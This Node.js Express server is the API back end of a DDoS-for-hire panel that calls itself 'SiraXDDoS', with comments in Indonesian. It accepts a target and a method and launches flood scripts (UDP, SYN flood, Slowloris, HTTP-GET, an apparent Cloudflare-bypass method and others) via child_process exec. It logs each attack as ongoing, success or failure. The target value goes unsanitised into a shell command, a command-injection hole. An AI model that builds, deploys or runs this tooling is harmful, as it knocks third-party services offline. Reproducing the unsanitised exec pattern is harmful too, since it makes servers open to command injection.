
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const PORT = process.env.PORT || 3001; // Port untuk server API Anda

// Middleware
app.use(cors()); // Mengizinkan permintaan dari panel Next.js Anda
app.use(bodyParser.json());

// Riwayat untuk melacak semua serangan (berjalan, sukses, gagal)
let attackHistory = [];
let nextAttackId = 1;

/**
 * Fungsi utama untuk meluncurkan serangan.
 */
function launchAttack(target, duration, method) {
    const attackId = nextAttackId++;
    const startTime = Date.now();
    console.log(`[${new Date().toISOString()}] Initiating Attack #${attackId}: Target=${target}, Duration=${duration}, Method=${method}`);
    
    // Tambahkan ke riwayat sebagai "Ongoing"
    const newAttack = {
        id: attackId,
        target,
        method,
        duration,
        startTime,
        status: 'Ongoing',
    };
    attackHistory.push(newAttack);
    
    // Pemetaan metode serangan
    const methodToFileMap = {
        'UDP': 'MoonXFast.js',
        'TCP': 'MoonXGood.js',
        'HTTP-GET': 'MoonXHttp.js',
        'SYN-FLOOD': 'SiraPps.js',
        'SLOW-LORIS': 'MoonXSlow.js',
        'DEATH': 'MoonXKill.js',
        'SiraXDDos': 'MoonXStars.js',
        'MoonXKill': 'MoonXKill.js',
        'MoonXFast': 'MoonXFast.js',
        'MoonXSus': 'MoonXSus.js',
        'MoonXStars': 'MoonXStars.js',
        'MoonXHttp': 'MoonXHttp.js',
        'MoonXGood': 'MoonXGood.js',
        'MoonXHigh': 'MoonXHigh.js',
        'MoonXCf': 'MoonXCf.js',
        'MoonXSlow': 'MoonXSlow.js',
        'MoonXPps': 'MoonXPps.js',
        'MoonXMc': 'MoonXMc.js',
        'ultra_clear': 'ultra_clear.js',
        'MoonXRst': 'MoonXRst.js'
    };
    
    const scriptFile = methodToFileMap[method];

    if (!scriptFile) {
        console.error(`Error: Method '${method}' is not mapped to a script file.`);
        const attack = attackHistory.find(a => a.id === attackId);
        if (attack) attack.status = 'Failure';
        return;
    }

    const execCommand = `node ./methods/${scriptFile} ${target} ${duration}`;
    console.log(`Executing: ${execCommand}`);

    exec(execCommand, (error, stdout, stderr) => {
        const attack = attackHistory.find(a => a.id === attackId);
        if (!attack) return;

        if (error) {
            console.error(`[${new Date().toISOString()}] Attack #${attackId} FAILED. Error: ${error.message}`);
            attack.status = 'Failure';
            return;
        }
        
        console.log(`[${new Date().toISOString()}] Attack #${attackId} SUCCESS.`);
        attack.status = 'Success';

        if (stderr) {
            console.warn(`[${new Date().toISOString()}] Attack #${attackId} finished with warnings: ${stderr}`);
        }
    });
}

// Endpoint API Utama
app.post('/attack', (req, res) => {
    const { target, port, duration, method } = req.body;

    if (!target || !port || !duration || !method) {
        return res.status(400).json({ error: 'Missing required parameters: target, port, duration, method.' });
    }

    const parsedDuration = parseInt(duration, 10);
    if (isNaN(parsedDuration) || parsedDuration <= 0) {
        return res.status(400).json({ error: 'Invalid duration.' });
    }

    launchAttack(target, parsedDuration, method);
    
    res.status(202).json({ message: 'Attack command received and initiated.' });
});

// Endpoint untuk mendapatkan statistik dan riwayat
app.get('/stats', (req, res) => {
    // Perbarui status serangan yang durasinya sudah habis
    const now = Date.now();
    attackHistory.forEach(attack => {
        if (attack.status === 'Ongoing') {
            const endTime = attack.startTime + (attack.duration * 1000);
            if (now > endTime) {
                // Asumsi serangan selesai tanpa error jika proses exec belum selesai tapi waktu sudah habis
                attack.status = 'Success'; 
            }
        }
    });

    const ongoingAttacks = attackHistory.filter(a => a.status === 'Ongoing').length;
    const successfulAttacks = attackHistory.filter(a => a.status === 'Success').length;
    const failedAttacks = attackHistory.filter(a => a.status === 'Failure').length;

    res.status(200).json({
        status: 'online',
        stats: {
            ongoing: ongoingAttacks,
            successful: successfulAttacks,
            failed: failedAttacks,
        },
        history: attackHistory.sort((a, b) => b.startTime - a.startTime) // Kirim riwayat, diurutkan terbaru dulu
    });
});

// Endpoint untuk melihat serangan yang sedang berjalan (untuk kompatibilitas)
app.get('/ongoing', (req, res) => {
    const ongoing = attackHistory.filter(p => p.status === 'Ongoing');
    res.status(200).json(ongoing);
});

app.get('/status', (req, res) => {
    const ongoing = attackHistory.filter(p => p.status === 'Ongoing').length;
    res.status(200).json({ status: 'online', running_attacks: ongoing });
});

// Mulai server
app.listen(PORT, () => {
    console.log(`SiraXDDoS API Server is running on http://localhost:${PORT}`);
    console.log('Ready to receive commands from the web panel.');
});
